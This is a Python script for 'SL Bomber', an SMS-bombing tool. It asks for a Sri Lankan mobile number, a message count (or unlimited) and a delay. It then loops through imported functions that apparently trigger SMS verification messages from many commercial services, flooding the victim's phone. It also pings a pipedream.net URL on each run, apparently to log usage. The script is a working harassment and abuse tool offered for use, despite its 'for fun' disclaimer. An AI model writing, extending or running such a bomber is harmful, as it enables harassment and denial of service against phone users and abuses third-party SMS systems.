#Script By Sandaru Ashen https://t.me/Sl_Sanda_Ru
from os import name,system
from time import sleep
from sys import stdout
from random import randrange,choice,choices
from api import *
cle = 'clear' if name == 'posix' else 'cls'
try:
	from colorama import Fore,init
except ModuleNotFoundError:
	system('pip3 install colorama')
	from colorama import Fore,init
init(autoreset=True)
system(cle)
blu=Fore.BLUE
cya=Fore.CYAN
gre=Fore.GREEN
yel=Fore.YELLOW
red=Fore.RED
mag=Fore.MAGENTA
liyel=Fore.LIGHTYELLOW_EX
lired=Fore.LIGHTRED_EX
limag=Fore.LIGHTMAGENTA_EX
liblu=Fore.LIGHTBLUE_EX
licya=Fore.LIGHTCYAN_EX
ligre=Fore.LIGHTGREEN_EX
bold='\x1b[1m'
fore=list((blu,cya,gre,yel,red,mag,liyel,lired,limag,liblu,licya,ligre))
logo=f'{choice(fore)}\x1b[1m\t\t   _________.__\n                  /   _____/|  |\n                  \\_____  \\ |  |\n                  /        \\|  |__\n                 /_______  /|____/\n   __________            \\/___.\n   \\______   \\ ____   _____\\_ |__   ___________\n    |    |  _//  _ \\ /     \\| __ \\_/ __ \\_  __ \\\n    |    |   (  <_> )  Y Y  \\ \\_\\ \\  ___/|  | \\/\n    |______  /\\____/|__|_|  /___  /\\___  >__|\n           \\/             \\/    \\/     \\/ {choice(fore)}v.1.5\n\t\t{choice(fore)}[+] By Sandaru Ashen'
bar=f'{choice(fore)}\x1b[1m_________________________{choice(fore)}_________________________\x1b[0m'
with open('.ascii','r') as f:
	loli=f.read().split('c')
if choices(list((True,False)),weights=(40,60))[0]:
	fore.append('\x1b[90m')
	print(bar+'\n')
	co=choices(fore)[0]
	for i in loli[randrange(0,len(loli))].split('\n'):
		print(('\x1b[1m'+co)+i)
		sleep(0.095)
	sleep(1.2)
print(bar+'\n')
print(logo)
print(bar+'\n')
sleep(0.3)
print(f'\x1b[1m\t\t\x1b[92m1.Start SL Bomber\n\t\t\x1b[93m2.About\n\t\t\x1b[91m3.Exit')
def prsent(count,num):
	stdout.write('\r' +choice(fore) +bold+'\t[*]'+' Bombing '+str(num)+'\t'+str(count)+' Sent')
	stdout.flush()
def Spinner():
	l=['|','/','-','\\']
	for i in l+l+l:
		stdout.write('\r'+bold+Fore.LIGHTYELLOW_EX+'[*] Checking Your Internet Connection  '+i)
		stdout.flush()
		sleep(0.2)
sleep(0.3)
while True:
	try:
		cho=int(input(Fore.LIGHTCYAN_EX+bold+'Enter Your Choice: '))
		if cho > 0 and cho <4:
			break
		else:
			Print(Fore.LIGHTRED_EX+bold+'[!] Please Enter A Correct Choice!')
	except:
			print(Fore.LIGHTRED_EX+bold+'[!] Incorrect Choice')
if cho==1:
	sleep(0.4)
	system(cle)
	print(bar+'\n')
	print(logo)
	print(bar+'\n')
	try:
		Spinner()
		get('https://a9c3af23099293570b4ae5a5c60e0762.m.pipedream.net')
		print(Fore.LIGHTGREEN_EX+bold+'\n[+] Connection Successful!')
		sleep(1.5)
		system(cle)
		print(bar+'\n')
		print(logo)
		print(bar+'\n')
	except Exception:
		sleep(0.4)
		print(Fore.LIGHTRED_EX+bold+'\n[!] You Aren\'t Connected To Internet!')
		sleep(0.3)
		print(Fore.LIGHTRED_EX+bold+'[!] Please Connect To Internet To Continue...')
		sleep(0.3)
		input(Fore.LIGHTRED_EX+bold+'[!] Exiting...\nPress Enter To Continue...')
		exit()
	while True:
		try:
			num=int(input(bold+'Enter The Target No(07xxxxxxxx): '))
			num='0'+str(num)
			if len(num) == 10 and str(num)[0:3] in ('070','071','072','075','076','077','078'):
				break
			else:
				print(Fore.LIGHTRED_EX + 'Please Enter A Correct Number!')
				continue
		except ValueError:
			print(Fore.LIGHTRED_EX + 'Please Enter A Phone Number Not Letters!')
			continue
	sleep(0.4)
	while True:
		times=input(bold+Fore.LIGHTYELLOW_EX+'How Many Messages (U) To Unlimited:')
		if times.isnumeric() or times == 'U' or	times == 'u':
			break
		else:
			print(bold+Fore.LIGHTRED_EX+'[!] Enter A Correct Amount Or \'U\' For Unlimited')
	sleep(0.4)
	while True:
		delay=input(bold+Fore.LIGHTMAGENTA_EX+'Enter Delay Time (In Seconds)\n\t\t[Recomended 5]:')
		if delay.isnumeric() and int(delay) > 0:
			delay=float(delay)
			break
		elif delay=='0':
			print(bold+Fore.LIGHTRED_EX+'[!] Value Must Be More Than 0')
		else:
			delay=5.0
			break
	system(cle)
	print(bar+'\n')
	print(logo)
	print(bar+'\n')
	sleep(0.5)
	print(f'\t{bold}Use This For Fun, Not For Revenge !!\n\t     https://t.me/Sl_Sanda_Ru')
	print(bar+'\n')
	print(Fore.YELLOW+bold+'\tPress Ctrl+c To Terminate The Bombing')
	if num[0:3] == '077' or num[0:3] == '076':
		count=0
		if times.isnumeric():
			while count< int(times):
				mega(num,delay)
				count+=1
				prsent(count,num)
				if count<int(times):
					yogo(num,delay)
					count+=1
					prsent(count,num)
					if count<int(times):
						guru(num,delay)
						count+=1
						prsent(count,num)
						if count<int(times):
							pat(num,delay)
							count+=1
							prsent(count,num)
							if count<int(times):
								doc(num,delay)
								count+=1
								prsent(count,num)
								if count<int(times):
									idea(num,delay)
									count+=1
									prsent(count,num)
									if count<int(times):
										ona(num,delay)
										count+=1
										prsent(count,num)
										if count<int(times):
											sing(num,delay)
											count+=1
											prsent(count,num)
											if count<int(times):
												kangaroo(num,delay)
												count+=1
												prsent(count,num)
												if count<int(times):
													airbnb(num,delay)
													count+=1
													prsent(count,num)
													if count<int(times):
														heal(num,delay)
														count+=1
														prsent(count,num)
														if count<int(times):
															savari(num,delay)
															count+=1
															prsent(count,num)
															if count<int(times):
																youcab(num,delay)
																count+=1
																prsent(count,num)
																if count<int(times):
																	upay(num,delay)
																	count+=1
																	prsent(count,num)
																	if count<int(times):
																		nanasa(num,delay)
																		count+=1
																		prsent(count,num)
																		if count<int(times):
																			domin(num,delay)
																			count+=1
																			prsent(count,num)
																			if count< int(times):
																				slmat(num,delay)
																				count+=1
																				prsent(count,num)
																				if count<int(times):
																					oli(num,delay)
																					count+=1
																					prsent(count,num)
		else:
			while True:
				mega(num,delay)
				count+=1
				prsent(count,num)
				yogo(num,delay)
				count+=1
				prsent(count,num)
				guru(num,delay)
				count+=1
				prsent(count,num)
				slmat(num,count)
				count+=1
				prsent(count,num)
				kangaroo(num,delay)
				count+=1
				prsent(count,num)
				pat(num,delay)
				count+=1
				prsent(count,num)
				sing(num,delay)
				count+=1
				prsent(count,num)
				doc(num,delay)
				count+=1
				prsent(count,num)
				idea(num,delay)
				count+=1
				prsent(count,num)
				ona(num,delay)
				count+=1
				prsent(count,num)
				airbnb(num,delay)
				count+=1
				prsent(count,num)
				heal(num,delay)
				count+=1
				prsent(count,num)
				savari(num,delay)
				count+=1
				prsent(count,num)
				youcab(num,delay)
				count+=1
				prsent(count,num)
				upay(num,delay)
				count+=1
				prsent(count,num)
				nanasa(num,delay)
				count+=1
				prsent(count,num)
				domin(num,delay)
				count+=1
				prsent(count,num)
				oli(num,delay)
				count+=1
	elif num[0:3] == '071' or num[0:3] == '070':
		count=0
		if times.isnumeric():
			while count< int(times):
				dtamart(num,delay)
				count+=1
				prsent(count,num)
				if count<int(times):
					dtamart2(num,delay)
					count+=1
					prsent(count,num)
					if count<int(times):
						yogo(num,delay)
						count+=1
						prsent(count,num)
						if count<int(times):
							guru(num,delay)
							count+=1
							prsent(count,num)
							if count<int(times):
								kangaroo(num,delay)
								count+=1
								prsent(count,num)
								if count<int(times):
									airbnb(num,delay)
									count+=1
									prsent(count,num)
									if count<int(times):
										pat(num,delay)
										count+=1
										prsent(count,num)
										if count<int(times):
											doc(num,delay)
											count+=1
											prsent(count,num)
											if count<int(times):
												idea(num,delay)
												count+=1
												prsent(count,num)
												if count<int(times):
													ona(num,delay)
													count+=1
													prsent(count,num)
													if count<int(times):
														heal(num,delay)
														count+=1
														prsent(count,num)
														if count<int(times):
															savari(num,delay)
															count+=1
															prsent(count,num)
															if count<int(times):
																sing(num,delay)
																count+=1
																prsent(count,num)
																if count<int(times):
																	youcab(num,delay)
																	count+=1
																	prsent(count,num)
																	if count<int(times):
																		upay(num,delay)
																		count+=1
																		prsent(count,num)
																		if count<int(times):
																			nanasa(num,delay)
																			count+=1
																			prsent(count,num)
																			if count<int(times):
																				domin(num,delay)
																				count+=1
																				prsent(count,num)
																				if count< int(times):
																					slmat(num,delay)
																					count+=1
																					prsent(count,num)
																					if count< int(times):
																						mobself(num,delay)
																						count+=1
																						prsent(count,num)
																						if count<int(times):
																							moba(num,delay)
																							count+=1
																							prsent(count,num)
																							if count<int(times):
																								oli(num,delay)
																								count+=1
																								prsent(count,num)
		else:
			while True:
				dtamart(num,delay)
				count+=1
				prsent(count,num)
				dtamart2(num,delay)
				count+=1
				prsent(count,num)
				yogo(num,delay)
				count+=1
				prsent(count,num)
				guru(num,delay)
				count+=1
				prsent(count,num)
				pat(num,delay)
				count+=1
				prsent(count,num)
				sing(num,delay)
				count+=1
				prsent(count,num)
				doc(num,delay)
				count+=1
				prsent(count,num)
				idea(num,delay)
				count+=1
				prsent(count,num)
				ona(num,delay)
				count+=1
				prsent(count,num)
				kangaroo(num,delay)
				count+=1
				prsent(count,num)
				mobself(num,delay)
				count+=1
				prsent(count,num)
				airbnb(num,delay)
				count+=1
				prsent(count,num)
				heal(num,delay)
				count+=1
				prsent(count,num)
				slmat(num,count)
				count+=1
				prsent(count,num)
				savari(num,delay)
				count+=1
				prsent(count,num)
				youcab(num,delay)
				count+=1
				prsent(count,num)
				upay(num,delay)
				count+=1
				prsent(count,num)
				nanasa(num,delay)
				count+=1
				prsent(count,num)
				domin(num,delay)
				count+=1
				prsent(count,num)
				moba(num,delay)
				count+=1
				prsent(count,num)
				oli(num,delay)
				count+=1
				prsent(count,num)
	elif num[0:3] == '078' or num[0:3] == '072':
		count=0
		if times.isnumeric():
			while count< int(times):
				hutcliq(num,delay)
				count+=1
				prsent(count,num)
				if count<int(times):
					hutself(num,delay)
					count+=1
					prsent(count,num)
					if count<int(times):
						yogo(num,delay)
						count+=1
						prsent(count,num)
						if count<int(times):
							guru(num,delay)
							count+=1
							prsent(count,num)
							if count<int(times):
								kangaroo(num,delay)
								count+=1
								prsent(count,num)
								if count<int(times):
									pat(num,delay)
									count+=1
									prsent(count,num)
									if count<int(times):
										doc(num,delay)
										count+=1
										prsent(count,num)
										if count<int(times):
										  sing(num,delay)
										  count+=1
										  prsent(count,num)
										  if count<int(times):
										  	idea(num,delay)
										  	count+=1
										  	prsent(count,num)
  											if count<int(times):
  												ona(num,delay)
  												count+=1
  												prsent(count,num)
  												if count<int(times):
  													airbnb(num,delay)
  													count+=1
  													prsent(count,num)
  													if count<int(times):
  														heal(num,delay)
  														count+=1
  														prsent(count,num)
  														if count<int(times):
  															savari(num,delay)
  															count+=1
  															prsent(count,num)
  															if count<int(times):
  																youcab(num,delay)
  																count+=1
  																prsent(count,num)
  																if count<int(times):
  																	upay(num,delay)
  																	count+=1
  																	prsent(count,num)
  																	if count<int(times):
  																		nanasa(num,delay)
  																		count+=1
  																		prsent(count,num)
  																		if count<int(times):
  																			domin(num,delay)
  																			count+=1
  																			prsent(count,num)
  																			if count< int(times):
  																				slmat(num,delay)
  																				count+=1
  																				prsent(count,num)
  																				if count<int(times):
  																					oli(num,delay)
  																					count+=1
  																					prsent(count,num)
		else:
			while True:
				hutcliq(num,delay)
				count+=1
				prsent(count,num)
				hutself(num,delay)
				count+=1
				prsent(count,num)
				yogo(num,delay)
				count+=1
				prsent(count,num)
				guru(num,delay)
				count+=1
				prsent(count,num)
				slmat(num,count)
				count+=1
				prsent(count,num)
				kangaroo(num,delay)
				count+=1
				prsent(count,num)
				pat(num,delay)
				count+=1
				prsent(count,num)
				sing(num,delay)
				count+=1
				prsent(count,num)
				doc(num,delay)
				count+=1
				prsent(count,num)
				idea(num,delay)
				count+=1
				prsent(count,num)
				ona(num,delay)
				count+=1
				prsent(count,num)
				airbnb(num,delay)
				count+=1
				prsent(count,num)
				heal(num,delay)
				count+=1
				prsent(count,num)
				savari(num,delay)
				count+=1
				prsent(count,num)
				youcab(num,delay)
				count+=1
				prsent(count,num)
				upay(num,delay)
				count+=1
				prsent(count,num)
				nanasa(num,delay)
				count+=1
				prsent(count,num)
				domin(num,delay)
				count+=1
				prsent(count,num)
				oli(num,delay)
				count+=1
				prsent(count,num)
	elif num[0:3] == '075':
		count=0
		if times.isnumeric():
			while count< int(times):
				yogo(num,delay)
				count+=1
				prsent(count,num)
				if count<int(times):
					guru(num,delay)
					count+=1
					prsent(count,num)
					if count<int(times):
						kangaroo(num,delay)
						count+=1
						prsent(count,num)
						if count<int(times):
							pat(num,delay)
							count+=1
							prsent(count,num)
							if count<int(times):
								doc(num,delay)
								count+=1
								prsent(count,num)
								if count<int(times):
									idea(num,delay)
									count+=1
									prsent(count,num)
									if count<int(times):
									  sing(num,delay)
									  count+=1
									  prsent(count,num)
									  if count<int(times):
  										ona(num,delay)
  										count+=1
  										prsent(count,num)
  										if count<int(times):
  											airbnb(num,delay)
  											count+=1
  											prsent(count,num)
  											if count<int(times):
  												heal(num,delay)
  												count+=1
  												prsent(count,num)
  												if count<int(times):
  													savari(num,delay)
  													count+=1
  													prsent(count,num)
  													if count<int(times):
  														youcab(num,delay)
  														count+=1
  														prsent(count,num)
  														if count<int(times):
  															upay(num,delay)
  															count+=1
  															prsent(count,num)
  															if count<int(times):
  																nanasa(num,delay)
  																count+=1
  																prsent(count,num)
  																if count<int(times):
  																	domin(num,delay)
  																	count+=1
  																	prsent(count,num)
  																	if count< int(times):
  																		slmat(num,delay)
  																		count+=1
  																		prsent(count,num)
  																		if count<int(times):
  																			oli(num,delay)
  																			count+=1
  																			prsent(count,num)
		else:
			while True:
				yogo(num,delay)
				count+=1
				prsent(count,num)
				guru(num,delay)
				count+=1
				prsent(count,num)
				kangaroo(num,delay)
				count+=1
				prsent(count,num)
				airbnb(num,delay)
				count+=1
				prsent(count,num)
				pat(num,delay)
				count+=1
				prsent(count,num)
				sing(num,delay)
				count+=1
				prsent(count,num)
				doc(num,delay)
				count+=1
				prsent(count,num)
				idea(num,delay)
				count+=1
				prsent(count,num)
				ona(num,delay)
				count+=1
				prsent(count,num)
				heal(num,delay)
				count+=1
				prsent(count,num)
				savari(num,delay)
				count+=1
				prsent(count,num)
				youcab(num,delay)
				count+=1
				prsent(count,num)
				upay(num,delay)
				count+=1
				prsent(count,num)
				slmat(num,count)
				count+=1
				prsent(count,num)
				nanasa(num,delay)
				count+=1
				prsent(count,num)
				domin(num,delay)
				count+=1
				prsent(count,num)
				oli(num,delay)
				count+=1
				prsent(count,num)
	print('\n'+bar+'\n')
	sleep(0.9)
	print(f'{bold}{Fore.LIGHTGREEN_EX}\t[+] Bombing Successful')
	sleep(0.7)
	ag=input(f'\t{bold}{choice(fore)}[?] Run The Bomber Again?(y/n) ')
	if ag == 'Y' or ag == 'y':
		system('python3 slbomber.py')
	else:
		exit()
elif cho == 2:
	system(cle)
	print(bar+'\n')
	print(logo)
	print(bar+'\n')
	print(f'{bold}\t\t\tAbout\n{choice(fore)}[+] Special Thanks To Packet Sniffing Software\n{choice(fore)}[+] If You Have Any Complains Or Future Requests Contact Me @ https://t.me/Sl_Sanda_Ru\n{choice(fore)}[+] Never Use The Script To Cause Harm/Discomfort/Trouble To Others\n{choice(fore)}[!] If You Know More Websites And Apps That Use SMS Verification Please Inform Me')
	input(f'{bold}{choice(fore)}\t[+] Press ENTER To Go Back To Main Menu')
	system('python3 slbomber.py')
else:
	exit()
